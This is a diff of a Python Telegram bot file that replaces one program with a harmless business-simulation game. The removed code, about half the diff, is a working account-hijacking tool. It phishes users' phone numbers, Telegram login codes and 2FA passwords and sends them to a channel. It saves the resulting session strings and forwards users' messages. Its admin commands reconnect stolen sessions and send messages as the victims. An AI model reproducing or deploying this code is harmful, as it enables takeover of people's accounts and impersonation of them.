@@ -1,545 +1,311 @@
 #!/usr/bin/env python3
-# main.py — Auth bot (polling) с минимальным HTTP-сервером для Render Web Service,
-# поддержкой force_sms, 2FA, шифрования сессий, рабочими админ-командами
+# main.py — Business Bot (aiogram polling) с корректными inline клавиатурами и callback handlers,
+# event engine, SQLite, и минимальным HTTP health (если нужно для Web Service)
 import os
 import json
+import random
 import logging
 import asyncio
-from datetime import datetime
-from typing import Optional, Dict
+import sqlite3
+from datetime import datetime, timedelta
 
-from aiogram import Bot, Dispatcher, Router
-from aiogram.types import Message, ReplyKeyboardMarkup, KeyboardButton
-from aiogram.filters import Command, CommandStart
-from aiogram.fsm.context import FSMContext
-from aiogram.fsm.state import State, StatesGroup
-from aiogram.fsm.storage.memory import MemoryStorage
-from aiogram import F
+from aiogram import Bot, Dispatcher
+from aiogram.types import Message, CallbackQuery
+from aiogram.filters import Command
+from aiogram.types import InlineKeyboardButton
+from aiogram.utils.keyboard import InlineKeyboardBuilder
 
-from telethon import TelegramClient, errors
-from telethon.sessions import StringSession
+# ====== Config ======
+BOT_TOKEN = os.getenv("PLAY")
+if not BOT_TOKEN:
+    raise RuntimeError("Set PLAY env var with bot token")
 
-# optional encryption
-try:
-    from cryptography.fernet import Fernet
-    CRYPTO_AVAILABLE = True
-except Exception:
-    CRYPTO_AVAILABLE = False
+DB_PATH = os.getenv("DB_PATH", "business.db")
+EVENT_INTERVAL_SECONDS = int(os.getenv("EVENT_INTERVAL_SECONDS", str(60 * 60 * 12)))  # default 12h
+HEALTH_PORT = int(os.getenv("PORT", "8000"))
 
-# minimal HTTP server
-from aiohttp import web
-
-# ======== Config from env ========
-BOT_TOKEN = os.getenv("PLAY", "").strip()
-CHANNEL = os.getenv("CHANNEL", "").strip()  # numeric id (e.g. -100...) or @username or empty
-API_ID = int(os.getenv("API_ID", "0"))
-API_HASH = os.getenv("API_HASH", "").strip()
-ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
-MASTER_KEY = os.getenv("MASTER_KEY", "").strip()  # optional Fernet key
-
-if not BOT_TOKEN or not API_ID or not API_HASH or not ADMIN_ID:
-    raise RuntimeError("Set PLAY, API_ID, API_HASH, ADMIN_ID in environment variables.")
-
-try:
-    CHANNEL_TARGET = int(CHANNEL) if CHANNEL else None
-except Exception:
-    CHANNEL_TARGET = CHANNEL or None
-
-# ======== Logging ========
+# ====== Logging ======
 logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
 logger = logging.getLogger(__name__)
 
-# ======== FSM ========
-class AuthFlow(StatesGroup):
-    waiting_for_phone = State()
-    waiting_for_code = State()
-    waiting_for_2fa = State()
+# ====== Bot / Dispatcher ======
+bot = Bot(BOT_TOKEN)
+dp = Dispatcher()
 
-router = Router()
-
-# ======== Runtime storages ========
-SESSIONS_DIR = "sessions"
-os.makedirs(SESSIONS_DIR, exist_ok=True)
-
-bot: Optional[Bot] = None
-user_clients: Dict[int, TelegramClient] = {}      # live Telethon clients keyed by user_id
-user_sessions: Dict[int, str] = {}                # stored session strings (encrypted if MASTER_KEY)
-user_phone: Dict[int, str] = {}                   # temporary phone during auth flow
-
-# ======== Encryption helpers ========
-USE_ENCRYPTION = False
-fernet = None
-if MASTER_KEY:
-    if not CRYPTO_AVAILABLE:
-        raise RuntimeError("MASTER_KEY set but cryptography not installed.")
-    try:
-        fernet = Fernet(MASTER_KEY.encode() if isinstance(MASTER_KEY, str) else MASTER_KEY)
-        USE_ENCRYPTION = True
-    except Exception as e:
-        raise RuntimeError("MASTER_KEY invalid. Generate with Fernet.generate_key().") from e
-
-def now_iso() -> str:
+# ====== DB init ======
+def now_iso():
     return datetime.utcnow().isoformat()
 
-def encrypt_text(text: str) -> str:
-    if USE_ENCRYPTION and fernet:
-        return fernet.encrypt(text.encode()).decode()
-    return text
+def init_db(path=DB_PATH):
+    conn = sqlite3.connect(path, check_same_thread=False)
+    cur = conn.cursor()
+    cur.executescript("""
+    CREATE TABLE IF NOT EXISTS users (
+        id INTEGER PRIMARY KEY,
+        tg_id INTEGER UNIQUE,
+        username TEXT,
+        created_at TEXT
+    );
+    CREATE TABLE IF NOT EXISTS businesses (
+        id INTEGER PRIMARY KEY,
+        user_id INTEGER,
+        type TEXT,
+        name TEXT,
+        balance INTEGER,
+        level INTEGER DEFAULT 1,
+        reputation INTEGER DEFAULT 0,
+        last_event_at TEXT
+    );
+    CREATE TABLE IF NOT EXISTS events (
+        id INTEGER PRIMARY KEY,
+        business_id INTEGER,
+        event_type TEXT,
+        payload TEXT,
+        resolved INTEGER DEFAULT 0,
+        created_at TEXT
+    );
+    CREATE TABLE IF NOT EXISTS transactions (
+        id INTEGER PRIMARY KEY,
+        business_id INTEGER,
+        amount INTEGER,
+        reason TEXT,
+        created_at TEXT
+    );
+    """)
+    conn.commit()
+    return conn
 
-def decrypt_text(text: str) -> str:
-    if USE_ENCRYPTION and fernet:
-        return fernet.decrypt(text.encode()).decode()
-    return text
+db = init_db()
 
-# ======== File helpers ========
-def session_path_for(user_id: int) -> str:
-    return os.path.join(SESSIONS_DIR, f"{user_id}.session.json")
+# ====== Helpers ======
+def get_user_by_tg(tg_id):
+    cur = db.cursor()
+    cur.execute("SELECT id,tg_id,username FROM users WHERE tg_id=?", (tg_id,))
+    return cur.fetchone()
 
-def save_session_to_file(user_id: int, session_str: str):
-    payload = {
-        "user_id": user_id,
-        "session": encrypt_text(session_str),
-        "saved_at": now_iso()
-    }
-    path = session_path_for(user_id)
-    try:
-        with open(path, "w", encoding="utf-8") as f:
-            json.dump(payload, f)
-        user_sessions[user_id] = payload["session"]
-        logger.info("Saved session for %s -> %s", user_id, path)
-    except Exception:
-        logger.exception("Failed to save session to %s", path)
+def create_user_if_not_exists(tg_id, username):
+    if not get_user_by_tg(tg_id):
+        cur = db.cursor()
+        cur.execute("INSERT INTO users (tg_id,username,created_at) VALUES (?,?,?)", (tg_id, username or "", now_iso()))
+        db.commit()
 
-def load_sessions_from_disk():
-    for fname in os.listdir(SESSIONS_DIR):
-        if not fname.endswith(".session.json"):
-            continue
-        path = os.path.join(SESSIONS_DIR, fname)
-        try:
-            with open(path, "r", encoding="utf-8") as f:
-                data = json.load(f)
-            uid = int(data.get("user_id"))
-            stored = data.get("session")
-            user_sessions[uid] = stored
-            logger.info("Loaded session preview for %s", uid)
-        except Exception:
-            logger.exception("Failed to load session file %s", path)
+def get_business_for_user(tg_id):
+    cur = db.cursor()
+    cur.execute("""SELECT b.id,b.type,b.name,b.balance,b.level,b.reputation,b.last_event_at
+                   FROM businesses b
+                   JOIN users u ON u.id=b.user_id
+                   WHERE u.tg_id=?""", (tg_id,))
+    return cur.fetchone()
 
-# ======== Telethon helper ========
-async def create_client_from_session(session: Optional[str] = None) -> TelegramClient:
-    sess = StringSession(session) if session else StringSession()
-    client = TelegramClient(sess, API_ID, API_HASH)
-    await client.connect()
-    return client
+def create_business(tg_id, btype, name, start_balance=1000):
+    cur = db.cursor()
+    cur.execute("SELECT id FROM users WHERE tg_id=?", (tg_id,))
+    r = cur.fetchone()
+    if not r:
+        return None
+    uid = r[0]
+    cur.execute("INSERT INTO businesses (user_id,type,name,balance,last_event_at) VALUES (?,?,?,?,?)",
+                (uid, btype, name, start_balance, now_iso()))
+    db.commit()
+    return cur.lastrowid
 
-# ======== UI keyboard ========
-def contact_keyboard() -> ReplyKeyboardMarkup:
-    return ReplyKeyboardMarkup(
-        keyboard=[[KeyboardButton(text="📱 Отправить номер", request_contact=True)]],
-        resize_keyboard=True
+# ====== Commands & UI ======
+@dp.message(Command("start"))
+async def cmd_start(message: Message):
+    create_user_if_not_exists(message.from_user.id, message.from_user.username or "")
+    kb = InlineKeyboardBuilder()
+    kb.button(text="Создать бизнес", callback_data="ui:create_business")
+    kb.button(text="Мой бизнес", callback_data="ui:my_business")
+    kb.button(text="События", callback_data="ui:events")
+    kb.button(text="Топ", callback_data="ui:leaderboard")
+    await message.answer(
+        "Привет! Добро пожаловать в Business Bot.\nВыберите действие:",
+        reply_markup=kb.as_markup()
     )
 
-# ======== HTTP server (minimal) so Render sees an open port ========
-async def start_http_server():
-    async def health(request):
+@dp.message(Command("create_business"))
+async def cmd_create_business_text(message: Message):
+    create_user_if_not_exists(message.from_user.id, message.from_user.username or "")
+    if get_business_for_user(message.from_user.id):
+        await message.answer("У вас уже есть бизнес. Посмотреть: /mybusiness")
+        return
+    create_business(message.from_user.id, "coffeeshop", "BeanLab", 1000)
+    await message.answer("Создана кофейня BeanLab с балансом 1000 монет. Первые события будут генерироваться автоматически.")
+
+@dp.message(Command("mybusiness"))
+async def cmd_mybusiness(message: Message):
+    create_user_if_not_exists(message.from_user.id, message.from_user.username or "")
+    b = get_business_for_user(message.from_user.id)
+    if not b:
+        await message.answer("У вас нет бизнеса. Создайте: /create_business или нажмите кнопку Создать бизнес.")
+        return
+    bid, typ, name, balance, level, rep, last_ev = b
+    await message.answer(f"{name} ({typ})\nБаланс: {balance}\nУровень: {level}\nРепутация: {rep}\nПоследнее событие: {last_ev}")
+
+@dp.message(Command("leaderboard"))
+async def cmd_leaderboard(message: Message):
+    cur = db.cursor()
+    cur.execute("SELECT name,balance FROM businesses ORDER BY balance DESC LIMIT 10")
+    rows = cur.fetchall()
+    if not rows:
+        await message.answer("Топ пока пуст.")
+        return
+    text = "Топ бизнесов:\n" + "\n".join([f"{i+1}. {r[0]} — {r[1]} монет" for i, r in enumerate(rows)])
+    await message.answer(text)
+
+# ====== UI callbacks (menu) ======
+@dp.callback_query(lambda c: c.data and c.data.startswith("ui:"))
+async def handle_ui(callback: CallbackQuery):
+    await callback.answer()
+    cmd = callback.data.split(":", 1)[1]
+    if cmd == "create_business":
+        if get_business_for_user(callback.from_user.id):
+            await callback.message.edit_text("У вас уже есть бизнес. Посмотреть: /mybusiness")
+            return
+        create_business(callback.from_user.id, "coffeeshop", "BeanLab", 1000)
+        await callback.message.edit_text("Создана кофейня BeanLab с балансом 1000 монет.")
+    elif cmd == "my_business":
+        b = get_business_for_user(callback.from_user.id)
+        if not b:
+            await callback.message.edit_text("У вас нет бизнеса. Создайте через /create_business")
+            return
+        bid, typ, name, balance, level, rep, last_ev = b
+        await callback.message.edit_text(f"{name} ({typ})\nБаланс: {balance}\nУровень: {level}\nРепутация: {rep}")
+    elif cmd == "events":
+        # trigger same as /events
+        await callback.message.edit_text("Используйте команду /events или ждите уведомления о событии.")
+    elif cmd == "leaderboard":
+        await callback.message.edit_text("Используйте /leaderboard чтобы посмотреть топ.")
+    else:
+        await callback.message.edit_text("Неизвестная команда меню.")
+
+# ====== Events: show and actions ======
+@dp.message(Command("events"))
+async def cmd_events(message: Message):
+    create_user_if_not_exists(message.from_user.id, message.from_user.username or "")
+    b = get_business_for_user(message.from_user.id)
+    if not b:
+        await message.answer("У вас нет бизнеса. Создайте: /create_business")
+        return
+    bid = b[0]
+    cur = db.cursor()
+    cur.execute("SELECT id,event_type,payload FROM events WHERE business_id=? AND resolved=0", (bid,))
+    rows = cur.fetchall()
+    if not rows:
+        await message.answer("Нет активных событий.")
+        return
+    for eid, etype, payload in rows:
+        data = json.loads(payload) if payload else {}
+        kb = InlineKeyboardBuilder()
+        kb.button(text="Инвестировать", callback_data=f"evt:{eid}:invest")
+        kb.button(text="Игнорировать", callback_data=f"evt:{eid}:ignore")
+        await message.answer(f"Событие: {etype}\n{data.get('msg','')}", reply_markup=kb.as_markup())
+
+@dp.callback_query(lambda c: c.data and c.data.startswith("evt:"))
+async def handle_event_action(callback: CallbackQuery):
+    await callback.answer()
+    try:
+        _, eid_s, action = callback.data.split(":", 2)
+        eid = int(eid_s)
+    except Exception:
+        await callback.message.edit_text("Некорректные данные действия.")
+        return
+
+    cur = db.cursor()
+    cur.execute("SELECT business_id,event_type,payload FROM events WHERE id=? AND resolved=0", (eid,))
+    ev = cur.fetchone()
+    if not ev:
+        await callback.message.edit_text("Событие уже обработано или не найдено.")
+        return
+    bid, etype, payload = ev
+
+    if action == "invest":
+        cur.execute("SELECT balance,name FROM businesses WHERE id=?", (bid,))
+        bal = cur.fetchone()
+        if not bal:
+            await callback.message.edit_text("Бизнес не найден.")
+            return
+        balance = bal[0]
+        name = bal[1]
+        change = random.randint(-50, 300)
+        newbal = balance + change - 200
+        cur.execute("UPDATE businesses SET balance=? WHERE id=?", (newbal, bid))
+        cur.execute("INSERT INTO transactions (business_id,amount,reason,created_at) VALUES (?,?,?,?)",
+                    (bid, change-200, "invest", now_iso()))
+        cur.execute("UPDATE events SET resolved=1 WHERE id=?", (eid,))
+        db.commit()
+        await callback.message.edit_text(f"Вы инвестировали 200. Результат: {'прибыль' if change>0 else 'убыток'} {change}. Баланс: {newbal}")
+    elif action == "ignore":
+        cur.execute("UPDATE events SET resolved=1 WHERE id=?", (eid,))
+        cur.execute("UPDATE businesses SET reputation = reputation - 1 WHERE id=?", (bid,))
+        db.commit()
+        await callback.message.edit_text("Игнорирование. Репутация понижена на 1.")
+    else:
+        await callback.message.edit_text("Неизвестное действие.")
+
+# ====== Event generator (background) ======
+async def event_generator():
+    await asyncio.sleep(5)
+    while True:
+        try:
+            cur = db.cursor()
+            cutoff_dt = datetime.utcnow() - timedelta(seconds=EVENT_INTERVAL_SECONDS)
+            cutoff = cutoff_dt.isoformat()
+            cur.execute("SELECT id,name FROM businesses WHERE last_event_at<?", (cutoff,))
+            rows = cur.fetchall()
+            for bid, bname in rows:
+                etype = random.choice(["customer_complaint", "supplier_offer", "inspection"])
+                payload = json.dumps({"msg": f"Случайное событие: {etype}"})
+                cur.execute("INSERT INTO events (business_id,event_type,payload,created_at) VALUES (?,?,?,?)",
+                            (bid, etype, payload, now_iso()))
+                cur.execute("UPDATE businesses SET last_event_at=? WHERE id=?", (now_iso(), bid))
+                db.commit()
+                # notify owner
+                cur2 = db.cursor()
+                cur2.execute("SELECT u.tg_id FROM businesses b JOIN users u ON u.id=b.user_id WHERE b.id=?", (bid,))
+                r = cur2.fetchone()
+                if r:
+                    tg_id = r[0]
+                    try:
+                        await bot.send_message(tg_id, f"Событие для бизнеса {bname}: {etype}\nИспользуйте /events чтобы посмотреть.")
+                    except Exception:
+                        logger.exception("Failed to send event notification")
+        except Exception:
+            logger.exception("Event generator error")
+        # short sleep for testing; increase in production
+        await asyncio.sleep(30)
+
+# ====== Minimal health HTTP server (optional) ======
+async def start_health_server():
+    try:
+        from aiohttp import web
+    except Exception:
+        logger.info("aiohttp not installed; skipping health server")
+        return
+    async def health(req):
         return web.Response(text="ok")
-    async def info(request):
-        return web.json_response({"service": "auth-bot", "time": now_iso()})
     app = web.Application()
     app.router.add_get("/", health)
-    app.router.add_get("/info", info)
-    port = int(os.getenv("PORT", os.getenv("RENDER_PORT", "8000")))
     runner = web.AppRunner(app)
     await runner.setup()
-    site = web.TCPSite(runner, "0.0.0.0", port)
+    site = web.TCPSite(runner, "0.0.0.0", HEALTH_PORT)
     await site.start()
-    logger.info("HTTP server started on 0.0.0.0:%s", port)
-    await asyncio.Event().wait()
+    logger.info("Health server started on port %s", HEALTH_PORT)
 
-# ======== Helper: admin check ========
-def is_admin(message: Message) -> bool:
-    uid = getattr(message.from_user, "id", None)
-    if uid is None:
-        return False
-    try:
-        return int(uid) == int(ADMIN_ID)
-    except Exception:
-        return False
-
-# ======== Handlers: authorization (owner flows) ========
-@router.message(CommandStart())
-async def cmd_start(message: Message, state: FSMContext):
-    await message.answer(
-        "Привет. Нажми кнопку «📱 Отправить номер», затем введи код в этот чат. "
-        "Код сначала отправляется по SMS (если доступно). Введите код ТОЛЬКО в этот чат и не пересылайте его.",
-        reply_markup=contact_keyboard()
-    )
-    await state.set_state(AuthFlow.waiting_for_phone)
-
-@router.message(AuthFlow.waiting_for_phone, F.contact)
-async def handle_contact(message: Message, state: FSMContext):
-    phone = message.contact.phone_number if message.contact else None
-    if not phone:
-        await message.answer("Не удалось получить номер. Попробуйте кнопку ещё раз.")
-        return
-
-    uid = message.from_user.id
-    user_phone[uid] = phone
-
-    try:
-        client = await create_client_from_session(None)
-    except Exception:
-        await message.answer("Ошибка создания временного клиента. Попробуйте позже.")
-        user_phone.pop(uid, None)
-        return
-
-    try:
-        await client.send_code_request(phone, force_sms=True)
-        await message.answer("Код отправлен по SMS. Введите цифры сюда. Не пересылайте код.")
-    except errors.FloodWaitError as e:
-        await message.answer(f"Слишком много запросов. Подождите {e.seconds} сек.")
-        await client.disconnect()
-        user_phone.pop(uid, None)
-        return
-    except Exception:
-        try:
-            await client.send_code_request(phone, force_sms=False)
-            await message.answer("SMS недоступно. Код отправлен через Telegram. Введите код сюда.")
-        except Exception:
-            await message.answer("Не удалось запросить код. Попробуйте позже.")
-            await client.disconnect()
-            user_phone.pop(uid, None)
-            return
-
-    user_clients[uid] = client
-    await state.set_state(AuthFlow.waiting_for_code)
-
-@router.message(AuthFlow.waiting_for_code, F.text.regexp(r"^\d{4,7}$"))
-async def handle_code(message: Message, state: FSMContext):
-    uid = message.from_user.id
-    code = message.text.strip()
-    phone = user_phone.get(uid)
-    client = user_clients.get(uid)
-
-    if not client or not phone:
-        await message.answer("Сессия не найдена. Начните заново: /start")
-        await state.clear()
-        user_phone.pop(uid, None)
-        return
-
-    try:
-        info = (
-            f"Код введён пользователем\n"
-            f"User: {message.from_user.full_name} @{message.from_user.username or '-'} ({uid})\n"
-            f"Телефон: {phone}\n"
-            f"Время: {now_iso()}"
-        )
-        if bot and CHANNEL_TARGET:
-            await bot.send_message(CHANNEL_TARGET, info)
-    except Exception:
-        pass
-
-    try:
-        await client.sign_in(phone=phone, code=code)
-        session_str = client.session.save()
-        save_session_to_file(uid, session_str)
-        await message.answer("Вход успешен. Сессия сохранена.")
-        if bot and CHANNEL_TARGET:
-            await bot.send_message(CHANNEL_TARGET, f"✅ Вход успешен для {uid} ({phone})")
-        user_phone.pop(uid, None)
-        await state.clear()
-    except errors.SessionPasswordNeededError:
-        await message.answer("Требуется пароль двухфакторной защиты. Введите пароль.")
-        await state.set_state(AuthFlow.waiting_for_2fa)
-    except errors.PhoneCodeInvalidError:
-        await message.answer("Код неверный. Проверьте SMS/сообщение и попробуйте снова.")
-    except errors.PhoneCodeExpiredError:
-        await message.answer("Код устарел. Запросите код снова: /start")
-        try:
-            await client.disconnect()
-        except Exception:
-            pass
-        user_clients.pop(uid, None)
-        user_phone.pop(uid, None)
-        await state.clear()
-    except errors.FloodWaitError as e:
-        await message.answer(f"Слишком много попыток. Подождите {e.seconds} сек.")
-        try:
-            await client.disconnect()
-        except Exception:
-            pass
-        user_clients.pop(uid, None)
-        user_phone.pop(uid, None)
-        await state.clear()
-    except Exception:
-        logger.exception("sign_in error")
-        await message.answer("Ошибка при попытке входа. Попробуйте позже.")
-        try:
-            await client.disconnect()
-        except Exception:
-            pass
-        user_clients.pop(uid, None)
-        user_phone.pop(uid, None)
-        await state.clear()
-
-@router.message(AuthFlow.waiting_for_2fa)
-async def handle_2fa(message: Message, state: FSMContext):
-    uid = message.from_user.id
-    password = message.text.strip()
-    client = user_clients.get(uid)
-    phone = user_phone.get(uid)
-
-    if not client or not phone:
-        await message.answer("Сессия потеряна. Начните заново: /start")
-        await state.clear()
-        user_phone.pop(uid, None)
-        return
-
-    try:
-        await client.sign_in(password=password)
-        session_str = client.session.save()
-        save_session_to_file(uid, session_str)
-        await message.answer("Вход с 2FA выполнен. Сессия сохранена.")
-        if bot and CHANNEL_TARGET:
-            await bot.send_message(CHANNEL_TARGET, f"✅ Вход (2FA) успешен для {uid} ({phone})")
-        try:
-            await client.disconnect()
-        except Exception:
-            pass
-        user_clients.pop(uid, None)
-        user_phone.pop(uid, None)
-        await state.clear()
-    except errors.FloodWaitError as e:
-        await message.answer(f"Подождите {e.seconds} сек.")
-        try:
-            await client.disconnect()
-        except Exception:
-            pass
-        user_clients.pop(uid, None)
-        user_phone.pop(uid, None)
-        await state.clear()
-    except Exception:
-        logger.exception("2FA sign_in error")
-        await message.answer("Не удалось войти с паролем. Проверьте пароль.")
-        try:
-            await client.disconnect()
-        except Exception:
-            pass
-        user_clients.pop(uid, None)
-        user_phone.pop(uid, None)
-        await state.clear()
-
-# ======== Catch-all that does NOT forward commands and ignores admin texts ========
-@router.message(F.text)
-async def catch_all_forward(message: Message):
-    text = message.text or ""
-    # ignore commands (start with '/')
-    if text.strip().startswith("/"):
-        return
-    # don't forward messages authored by admin
-    uid = getattr(message.from_user, "id", None)
-    if uid is not None and int(uid) == int(ADMIN_ID):
-        return
-    try:
-        info = f"Сообщение от {message.from_user.full_name} @{message.from_user.username or '-'} ({uid}):\n{text}\n{now_iso()}"
-        if bot and CHANNEL_TARGET:
-            await bot.send_message(CHANNEL_TARGET, info)
-    except Exception:
-        logger.exception("forwarding failed")
-
-# ======== Admin commands (working) ========
-@router.message(Command("ping"))
-async def admin_ping(message: Message):
-    if not is_admin(message):
-        await message.answer("Нет доступа.")
-        return
-    uid = getattr(message.from_user, "id", None)
-    await message.answer(f"pong (from_user={uid} ADMIN_ID={ADMIN_ID})")
-
-@router.message(Command("list_sessions"))
-async def admin_list_sessions(message: Message):
-    if not is_admin(message):
-        await message.answer("Нет доступа.")
-        return
-    files = [f for f in os.listdir(SESSIONS_DIR) if f.endswith(".session.json")]
-    if not files:
-        await message.answer("Нет сохранённых сессий.")
-        return
-    lines = []
-    for fname in sorted(files):
-        path = os.path.join(SESSIONS_DIR, fname)
-        try:
-            with open(path, "r", encoding="utf-8") as f:
-                data = json.load(f)
-            uid = data.get("user_id", "unknown")
-            preview = data.get("session", "")[:36] + "..." if data.get("session") else "—"
-            connected = "connected" if (int(uid) in user_clients and user_clients[int(uid)].is_connected()) else "idle"
-            lines.append(f"{uid} | {fname} | {connected} | {preview}")
-        except Exception:
-            lines.append(f"{fname} | ошибка чтения")
-    await message.answer("\n".join(lines))
-
-@router.message(Command("who_connected"))
-async def admin_who_connected(message: Message):
-    if not is_admin(message):
-        await message.answer("Нет доступа.")
-        return
-    lines = []
-    for uid, stored in user_sessions.items():
-        try:
-            preview = decrypt_text(stored)[:28] + "..." if USE_ENCRYPTION else (stored[:28] + "...")
-        except Exception:
-            preview = "ошибка_декодирования"
-        connected = "connected" if (uid in user_clients and user_clients[uid].is_connected()) else "idle"
-        lines.append(f"{uid} | {connected} | {preview}")
-    await message.answer("\n".join(lines) if lines else "Нет сессий.")
-
-@router.message(Command("use_session"))
-async def admin_use_session(message: Message):
-    if not is_admin(message):
-        await message.answer("Нет доступа.")
-        return
-    parts = message.text.split()
-    if len(parts) < 2:
-        await message.answer("Использование: /use_session <user_id>")
-        return
-    try:
-        target = int(parts[1])
-    except ValueError:
-        await message.answer("Неверный user_id")
-        return
-    path = session_path_for(target)
-    if not os.path.isfile(path):
-        await message.answer("Файл сессии не найден.")
-        return
-    try:
-        with open(path, "r", encoding="utf-8") as f:
-            data = json.load(f)
-        session_stored = data.get("session")
-        session_str = decrypt_text(session_stored) if USE_ENCRYPTION else session_stored
-        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
-        await client.connect()
-    except Exception as e:
-        logger.exception("use_session error")
-        await message.answer(f"Ошибка подключения: {e}")
-        return
-    user_clients[target] = client
-    await message.answer(f"Сессия для {target} подключена.")
-
-@router.message(Command("send_as"))
-async def admin_send_as(message: Message):
-    if not is_admin(message):
-        await message.answer("Нет доступа.")
-        return
-    parts = message.text.split(maxsplit=3)
-    if len(parts) < 4:
-        await message.answer("Использование: /send_as <user_id> <chat_id> <текст>")
-        return
-    try:
-        target = int(parts[1])
-    except ValueError:
-        await message.answer("Неверный user_id")
-        return
-    chat = parts[2]
-    text = parts[3]
-
-    client = user_clients.get(target)
-    temporary_connect = False
-
-    if not client or not getattr(client, "is_connected", lambda: False)():
-        path = session_path_for(target)
-        if not os.path.isfile(path):
-            await message.answer("Сессия не найдена на диске.")
-            return
-        try:
-            with open(path, "r", encoding="utf-8") as f:
-                data = json.load(f)
-            session_stored = data.get("session")
-            session_str = decrypt_text(session_stored) if USE_ENCRYPTION else session_stored
-            client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
-            await client.connect()
-            user_clients[target] = client
-            temporary_connect = True
-        except Exception as e:
-            logger.exception("send_as connect error")
-            await message.answer(f"Ошибка подключения сессии: {e}")
-            return
-
-    try:
-        await client.send_message(chat, text)
-        await message.answer("Отправлено.")
-    except Exception as e:
-        logger.exception("send_as send error")
-        await message.answer(f"Ошибка при отправке: {e}")
-    finally:
-        if temporary_connect:
-            try:
-                await client.disconnect()
-            except Exception:
-                pass
-            user_clients.pop(target, None)
-
-@router.message(Command("disconnect_session"))
-async def admin_disconnect_session(message: Message):
-    if not is_admin(message):
-        await message.answer("Нет доступа.")
-        return
-    parts = message.text.split()
-    if len(parts) < 2:
-        await message.answer("Использование: /disconnect_session <user_id>")
-        return
-    try:
-        uid = int(parts[1])
-    except ValueError:
-        await message.answer("Неверный user_id")
-        return
-    client = user_clients.pop(uid, None)
-    if client:
-        try:
-            await client.disconnect()
-        except Exception:
-            pass
-        await message.answer(f"Клиент {uid} отключён.")
-    else:
-        await message.answer("Клиент не был подключён.")
-
-# ======== Background worker placeholder (if required) ========
-async def send_worker():
-    while True:
-        await asyncio.sleep(60)
-
-# ======== Main entry ========
-async def main():
-    global bot
-    load_sessions_from_disk()
-    bot = Bot(token=BOT_TOKEN)
-    dp = Dispatcher(storage=MemoryStorage())
-    dp.include_router(router)
-
-    # remove webhook if any to avoid conflicts with polling
-    try:
-        await bot.delete_webhook(drop_pending_updates=True)
-    except Exception:
-        pass
-
-    web_task = asyncio.create_task(start_http_server())
-    worker = asyncio.create_task(send_worker())
-
-    try:
-        logger.info("Bot polling started")
-        await dp.start_polling(bot)
-    finally:
-        web_task.cancel()
-        worker.cancel()
-        for uid, client in list(user_clients.items()):
-            try:
-                await client.disconnect()
-            except Exception:
-                pass
-        try:
-            await bot.session.close()
-        except Exception:
-            pass
+# ====== Startup ======
+async def on_startup():
+    # run background tasks
+    asyncio.create_task(event_generator())
+    asyncio.create_task(start_health_server())
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    try:
+        loop = asyncio.get_event_loop()
+        loop.create_task(on_startup())
+        logger.info("Starting polling")
+        dp.run_polling(bot)
+    finally:
+        try:
+            loop.run_until_complete(bot.session.close())
+        except Exception:
+            pass
